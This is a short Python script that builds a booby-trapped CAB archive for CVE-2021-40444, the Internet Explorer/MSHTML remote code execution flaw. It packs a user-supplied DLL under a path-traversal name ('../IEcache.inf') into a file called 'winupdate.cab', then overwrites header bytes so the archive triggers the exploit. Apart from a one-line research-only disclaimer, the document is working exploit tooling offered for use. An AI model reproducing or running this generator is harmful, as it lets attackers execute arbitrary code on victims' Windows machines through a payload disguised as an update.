#CVE-2021-40444 Cab file generator by ASL IT Security.com. 
#Generate your dll and place it a directory above with name IEcache.inf
#This generator is for research and educational purposes only. Use at your own responsibility
#The cabrc.exe is Microsoft exe included in Internet Explorer Administration Kit and can be downloaded from https://docs.microsoft.com/en-us/internet-explorer/ie11-ieak/ieak-information-and-downloads
#Use python2.7

import os, sys, subprocess, binascii, time


filename = "../IEcache.inf"
args = "cabarc.exe -i 1234 -m NONE -p n winupdate.cab " + filename
subprocess.call(args)

time.sleep(1)

cab = "winupdate.cab"
fh = open(cab,mode='r+')
buff=fh.read()
fh.seek(0)
fh.write(buff[:44]+'\x00\x22\x44\x00')
fh.close()
